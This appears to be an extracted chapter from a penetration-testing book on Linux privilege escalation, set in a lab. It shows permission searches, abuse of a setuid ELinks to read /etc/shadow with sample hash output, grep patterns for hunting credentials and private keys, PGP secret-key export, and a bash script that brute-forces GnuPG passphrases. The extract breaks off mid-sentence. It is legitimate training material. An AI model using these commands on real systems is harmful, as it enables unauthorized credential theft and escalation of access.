@@ -1,0 +1,269 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 8 - covered the FHS, which aims to standardize the locations of certain files and directories on Linux systems. But files, whether they’re configurations or the source code of an application, could live pretty much anywhere, so it’s important to figure out what is accessible to our current privilege context.
+Luckily, searching for readable, writable, and executable files and directories is quite easy. Tools such as find can even locate files based on permissions. Let’s explore how to do this.
+To search for files and directories that are readable by everyone on a system (meaning others), beginning from the root directory and searching recursively, use the following command:
+$ find / -perm -o=r
+To search for files only, pass the -type f flag, and to search directories only, pass the -type d flag:
+$ find / -type f -perm -o=r
+$ find / -type d -perm -o=r
+Security Relevance Score: 14
+Word Count: 2684
+Extracted: 2025-06-13 23:40:57
+
+---
+
+covered the FHS, which aims to standardize the locations of certain files and directories on Linux systems. But files, whether they’re configurations or the source code of an application, could live pretty much anywhere, so it’s important to figure out what is accessible to our current privilege context.
+Luckily, searching for readable, writable, and executable files and directories is quite easy. Tools such as find can even locate files based on permissions. Let’s explore how to do this.
+To search for files and directories that are readable by everyone on a system (meaning others), beginning from the root directory and searching recursively, use the following command:
+$ find / -perm -o=r
+To search for files only, pass the -type f flag, and to search directories only, pass the -type d flag:
+$ find / -type f -perm -o=r
+$ find / -type d -perm -o=r
+
+To suppress any access-denied errors while searching, pipe the standard error stream to /dev/null:
+$ find / -perm -o=r 2> /dev/null
+To search for files and directories that anyone can write to, use the following command:
+$ find / -perm -o=w
+A search for executable files and directories follows the same pattern. To search for files and directories that are executable by everyone, use the following command:
+$ find / -perm -o=x
+The term executable directories may sound confusing, but essentially, setting an executable permission (x) on a folder allows users to navigate into the directory (for example, with cd).
+You can combine these commands into one, such as the following:
+$ find / -type f -perm -o=rwx
+This command finds all globally readable, writable, and executable files.
+The find command also allows us to search for particular permissions by using the -perm flag. We could use this to search for files set with either SetUID or SetGID. The following searches for SetGID files:
+$ find / -perm -4000 2> /dev/null
+Similarly, this command searches for SetUID files:
+$ find / -perm -2000 2> /dev/null
+We can also locate directories set with the sticky bit flag:
+$ find / -perm -1000 2> /dev/null
+Searching for these special permissions will likely yield results on most Linux systems, as some files have these permissions set by default. It’s important to become familiar with these files so you can easily distinguish between default system files and ones that were modified by the system owner.
+
+
+Exploiting a SetUID Misconfiguration
+Let’s exploit a program with the SetUID bit set. On the compromised machines, run a system-wide search for SetUID and SetGID files, then perform an internet search to figure out which of these files are meant to have these flags set and which are misconfigured.
+Your search should identify ELinks, a web browser that allows users to surf websites directly from the command line by displaying results as simple text output. Figure 9-2 shows what browsing Google looks like when using ELinks.
+
+
+Figure 9-2: Browsing Google with the ELinks command line web browser
+
+On the backup user account of p-jumpbox-01 (172.16.10.13), you should find the ELinks binary located at /usr/bin/elinks. To verify that the SetUID is set, use the ls or the stat command:
+$ stat /usr/bin/elinks
+
+  File: /usr/bin/elinks
+  Size: 1759424       Blocks: 3440       IO Block: 4096   regular file
+Device: 0,57 Inode:  4763007             Links: 1
+Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+--snip--
+
+ELinks will execute in the root context when we run it, so if we’re able to get it to do something interesting, like read a local file, we should be able to access sensitive files available only to root. Explore the ELinks options by passing the --help flag to the command:
+$ elinks --help
+
+Usage: elinks [OPTION]... [URL]...
+Options:
+  -anonymous [0|1]      Restrict to anonymous mode
+  -auto-submit [0|1]    Autosubmit first form
+  -base-session <num>   Clone internal session with given ID
+--snip--
+
+Next, use the -dump 1 flag to read a website address and print it to the standard output stream:
+$ elinks https://google.com -dump 1
+ELinks should parse data from the website, such as a collection of links, and print it to the terminal.
+How might we exploit this behavior? Well, just as the http:// or https:// schemes allow us to read data from websites, the file:/// scheme allows web browsers to read files on the local system. Since we’re running as root, we can read sensitive paths such as /etc/shadow, which stores password hashes:
+$ elinks file:///etc/shadow -dump 1
+
+root:*:19523:0:99999:7::: daemon:*:19523:0:99999:7:::
+jmartinez:$y$j9T$jHIwZ8SKS4GGK9GrHOHTu.$rOJY2gSlP6ZgN2IB0qoW0oBFgs6DWiBH
+acroSQw8Ir7:19536:0:99999:7:::
+dbrown:$y$j9T$hDNnbY/r00FC/jeE4BfCL1$6HbLxT8T7D6sUebz1T0fp0xdTjIjVoWjTLM
+DMdiHZBD:19536:0:99999:7:::
+ogarcia:$y$j9T$aiqqNSE8dqtvZ62otyoOB/$2mLRlxi4iSlJxV5qTjbqdKSVyc4aGFKtpz
+pn4YjZNID:19536:0:99999:7:::
+arodriguez:$y$j9T$htdo8u5CtRaOiHkFxx.s7/$lzBMPHzw96si.CI3eIFjJj0FfdqwgNH
+efhya0VpQso.:19536:0:99999:7:::
+--snip--
+
+It’s important to note that while we abused ELinks, we didn’t exploit a vulnerability in ELinks itself; rather, we used a well-known browser feature for malicious purposes with the help of the SetUID bit.
+
+
+Scavenging for Credentials
+In this section, we cover places on the system where you might find sensitive files containing credentials. Even encrypted credentials could be weak and brute-forceable, and you might find them used across multiple servers. Privilege escalation doesn’t always involve a highly sophisticated exploit; if you discover credentials lying around on disk, you might be able to simply log in to a more powerful account.
+
+Passwords and Secrets
+Passwords and secrets, such as API keys, can live in many places on a system. Administrators might run commands that contain their usernames and passwords, applications may log credentials in logfiles, and configuration files may contain credentials as part of a connection string. Search for credentials in places such as the following:
+
+Configuration files under the /etc directory
+Environment variables
+Logfiles
+History files of users
+Scheduled tasks, such as cron jobs
+Script files written in languages such as bash or Python
+Memory
+Boot configuration files
+Keyrings
+System files such as /etc/shadow
+
+There are multiple approaches to uncovering such secrets. We could use bash to recursively search for password patterns, craft searches for specific files and extensions of interest, or manually inspect sensitive filesystem areas.
+Let’s modify the search techniques introduced in “Finding Files Based on Permissions” on page 207 to look for specific filenames of interest. For example, search for readable files with the word password in them by using a case-insensitive grep filter:
+$ find . -type f -exec grep -i password {} \;
+Then search for readable files that contain words such as api_key, token, and key:
+$ find . -type f -exec grep -i "api_key\|token\|apitoken\|key" {} \;
+You might also search for readable files with specific extensions like .hashes, .env, and .credentials:
+$ find . -type f -name "*.hashes" -o -name "*.env" -o -name "*.credentials"
+Searching for hardcoded credentials without running into false positives is an art, but you could use data gleaned from the reconnaissance phase or external resources to build more fine-tuned search patterns.
+One such resource is Nuclei’s inventory of templates for finding interesting data (such as passwords, API tokens, and cloud account IDs) in local files: https://github.com/projectdiscovery/nuclei-templates/tree/main/file/keys. For instance, the github-oauth-token.yaml template searches for the GitHub Open Authentication (OAuth) tokens used to log in to GitHub accounts:
+id: github-oauth-token
+
+info:
+  name: Github OAuth Access Token
+  author: tanq16
+  severity: high
+  tags: token,file,github
+
+file:
+  - extensions:
+      - all
+
+    extractors:
+      - type: regex
+        regex:
+          - "gho_.{36}"
+
+This template looks for strings that start with the character sequence gho_ and are followed by a string of 32 characters. If you don’t want to use Nuclei, you could input this regular expression into a grep search:
+$ grep -E 'gho_.{36}' somefile.txt
+We use grep -E to specify a regular-expression-based filter. Alternatively, you could use egrep, a wrapper to the grep command that passes the -E flag under the hood, for convenience:
+$ egrep 'gho_.{36}' somefile.txt
+You could also pass the -R flag to perform a recursive search:
+$ grep -R 'gho_.{36}' /some_directory
+This is useful for searching a directory that has many files, such as a web application’s source code directory.
+
+
+Private Keys
+Private keys are a huge asset to penetration testers. We can use them to connect to servers, decrypt files, perform man-in-the-middle attacks, and more. You might find private keys in restricted folders, such as /root, or in an individual user’s home directory, depending on its type and owner.
+
+SSH Keys
+Unless modified, SSH private keys are usually named id_rsa, after the RSA cryptosystem, or id_dsa, after the Digital Signature Algorithm (DSA) cryptosystem, without an extension. Their corresponding public key is usually either id_rsa.pub or id_dsa.pub. You’ll typically find SSH keys under the hidden directory .ssh for each user account. For example, the user Eve’s SSH keys would be stored at /home/eve/.ssh/id_rsa and /home/eve/.ssh/id_rsa.pub if generated using RSA.
+SSH private keys have a well-defined file structure, shown here:
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAqcqpBTfIwqwiFtOvM1DlTEplYuwYyrc4OBOBR2Wz6ItsX+cA/zV4
+--snip--
+-----END OPENSSH PRIVATE KEY-----
+
+The keys use Privacy-Enhanced Mail (PEM), a common format to store and transfer cryptographic keys. PEM starts with a header (BEGIN), followed by the key data and a footer (END). Here are common headers you may see in the wild:
+-----BEGIN SSH2 PRIVATE KEY-----
+-----BEGIN OPENSSH PRIVATE KEY-----
+-----BEGIN PRIVATE KEY-----
+-----BEGIN RSA PRIVATE KEY-----
+-----BEGIN DSA PRIVATE KEY-----
+-----BEGIN EC PRIVATE KEY-----
+
+Recursively searching for these strings in files is fairly easy. For example, take a look at this grep command:
+$ grep -R -- "-----BEGIN" /some_directory
+The -R option searches recursively, and the double dash (--) prior to the search pattern "-----BEGIN" signifies the end of the arguments. This allows us to easily search for strings that contain dashes, such as the ones in PEM headers.
+You could also try to search for keys of the following types: ecdsa, ecdsa-sk, ed25519, and ed25519-sk. Changing the key type will change the names of the generated keys. For rcdsa, the keys are named id_ecdsa and id_ecdsa.pub, whereas for ed25519, they’re named id_ed25519 and id_ed25519.pub.
+Also look for SSH host keys, the cryptographic keys that validate a server’s identity. When an SSH client connects to an SSH server, the client checks the server’s identity by using the public host key, which is stored in the client’s known_hosts file. If this public key has changed, the SSH client generates an alert saying it can’t verify the host.
+Public and private SSH host keys are usually stored under the /etc/ssh directory and may have names such as ssh_host_ecdsa_key, ssh_host_rsa_key, ssh_host_ed25519_key, ssh_host_ecdsa_key.pub, ssh_host_rsa_key.pub, or ssh_host_ed25519_key.pub.
+These keys are usually generated automatically when the server is provisioned, though it’s also possible to manually generate them. Compromising SSH host keys could allow you to impersonate a server on a network.
+
+
+PGP Keys
+Pretty Good Privacy (PGP) is an encryption scheme used to encrypt files, emails, and more. Like SSH keys, PGP private keys use the PEM format. They look something like this:
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+lQVYBGSeRngBDACyE/xXrs89ek7Qcrx0rpupVWkBwv5cZJX3SF64mUlmRWckEBMB
+O8STBlgCVixH7pw5Ke0UPFwOInZMzqAYWuqHwr6MJOVYzhVeEJWIbnAH/7ioh0ti
+--snip--
+-----END PGP PRIVATE KEY BLOCK-----
+
+GNU Privacy Guard (GnuPG) is an implementation of OpenPGP (defined in RFC 4880) that provides command line utilities for managing PGP keys. It lets you generate keys, import and export keys, verify signatures, and more.
+You can generate a GnuPG key by using the gpg tool and running the gpg --generate-key command. When a user generates keys with GnuPG, it stores the keys in a keyring that is usually located in a hidden dot directory named .gnupg under the user’s home directory. (Users can change the keyring’s location by setting the environment variable GNUPGHOME to a different directory location.)
+Within this directory, the~/.gnupg/private-keys-v1.d/ folder contains private keys, the ~/.gnupg/trustdb.gpg file contains the GnuPG trust database, and the ~/.gnupg/pubring.kbx file contains metadata. Therefore, you first need to have access to an account before being able to list the account’s keys.
+Let’s export PGP keys from one of the lab’s machines. On p-web-01 (172.16.10.10), run the following command:
+$ gpg --list-keys
+This should output any PGP keys accessible to the user, including keys that appear to belong to a server account, arodriguez@acme-infinity-servers.com:
+--snip--
+/root/.gnupg/pubring.kbx
+------------------------
+pub   rsa3072
+
+      9DD565D2BB63D9241ACF9F61671507A368BFDC40
+uid           [ultimate] arodriguez@acme-infinity-servers.com
+sub   rsa3072 [E]
+
+If we wanted to steal this private key, we could export it to a file in the following way:
+$ gpg --output private.pgp --armor --export-secret-key arodriguez@acme-infinity-servers.com
+The --output private.pgp argument writes the content to a file, --armor outputs the key in ASCII format, and --export-secret-key arodriguez@acme-infinity-servers.com specifies the key to export based on an email address.
+In certain cases, however, this export may fail. This is because GnuPG keys can be protected if the creator used a passphrase during the key generation, and you’ll need to supply the passphrase to perform the export. In Exercise 16, we’ll cover a way to bypass this protection by using bash.
+
+
+Certificates
+In the post-compromise stage of a penetration test, you may sometimes encounter a server that transmits data over encrypted channels. For example, a web server might send HTTP data over SSL to clients.
+Popular web servers such as Apache or nginx commonly store certificates in /etc/ssl/certs and private keys in /etc/ssl/private. Certificates usually have the .crt extension, while private keys have the .key or .pem extensions. Those PEM files could contain just the public key, or they could store the entire certificate chain (including the private key, the public key, and root certificates).
+If you have access to an Apache or nginx configuration file, the configuration keys listed therein usually point to the location of the certificate and its private key. We’ve bolded these keys in the following nginx configuration file:
+server {
+    listen              443 ssl;
+    server_name         example.com;
+    ssl_certificate     example.com.rsa.crt;
+    ssl_certificate_key example.com.rsa.key;
+}
+
+These keys look like the following in the Apache configuration for an HTTPS-enabled website:
+<VirtualHost *:443>
+   ServerName example.com
+   DocumentRoot /var/www/example.com
+
+   SSLEngine on
+   SSLCertificateFile /etc/ssl/certs/apache-selfsigned.crt
+   SSLCertificateKeyFile /etc/ssl/private/apache-selfsigned.key
+</VirtualHost>
+
+You could perform a system-wide search for nginx or Apache configuration files, then cross-examine the location of the keys to see whether they’re accessible to you.
+Proxies can also be configured to use SSL. Here is an example configuration file for HAProxy, with the location of the PEM file shown in bold:
+frontend www.example.com
+  bind *:443 ssl crt  /etc/haproxy/certs/example_com.pem
+  reqadd X-Forwarded-Proto:\ https
+  default_backend backend_http
+
+HAProxy, which performs load balancing, may define a few backend servers, each with its own certificate files:
+backend web_servers
+    balance roundrobin
+    server server1 10.0.1.3:443 check maxconn 20 ssl ca-file /etc/ssl/certs/ca.pem
+    server server2 10.0.1.4:443 check maxconn 20 ssl ca-file /etc/ssl/certs/ca.pem
+
+You can identify these files based on the ca-file parameter.
+Exercise 16: Brute-Forcing GnuPG Key Passphrases
+When passphrase protection exists on a GnuPG key, you won’t be able to export the key without providing the passphrase. No sweat, though; there is a bash-y way to brute-force the passphrase.
+Listing 9-1 operates on a file named passphrases.txt containing a bunch of possible passphrases. It assumes the GnuPG key’s ID is the email identity@blackhatbash.com.
+
+gnupg_passphrase_bf.sh
+#!/bin/bash
+❶ KEY_ID="identity@blackhatbash.com"
+
+❷ if ! gpg --list-keys | grep uid | grep -q "${KEY_ID}"; then
+  echo "Could not find identity/key ID ${KEY_ID}"
+  exit 1
+fi
+
+while read -r passphrase; do
+  echo "Brute forcing with ${passphrase}..."
+❸ if echo "${passphrase}" | gpg --batch \
+                                --yes \
+                                --pinentry-mode loopback \
+                                --passphrase-fd 0 \
+                                --output private.pgp \
+                                --armor \
+                                --export-secret-key "${KEY_ID}"; then
+       echo "Passphrase is: ${passphrase}"
+       echo "Private key is located at private.pgp"
+       exit 0
+  fi
+done < passphrases.txt
+
+Listing 9-1: Brute-forcing protected GnuPG private keys
+In this script, we define a variable named KEY_ID to specify the key ID we want to brute-force ❶. At ❷, we list the keys available and grep for the key ID we’ll be brute-forcing to ensure it exists. Then we iterate over the passphrase.txt file line by line by using a while loop, echo the passphrase ❸, and pass it as input to the gpg command.
+This command takes a bunch of important parameters that allow us to brute-force the passphrase in an automated fashion. The --batch --yes flag allows the pgp command to execute while unattended, --pinentry-mode loopback allows us to fake a pin entry, --passphrase-fd 0 makes pgp read the passphrase from file descriptor zero (the standard input stream), --output writes the output to a file of our choice, --armor formats the exported key by using ASCII, and --export-secret-key is the key identifier to export.
+If the pgp command returns an exit code of zero, either the passphrase worked or no passphrase was set to begin with, at which point we exit.
+
+NOTE
+
+You can find this chapter’s scripts at https://github.com/dolevf/Black-Hat-Bash/blob/master/ch
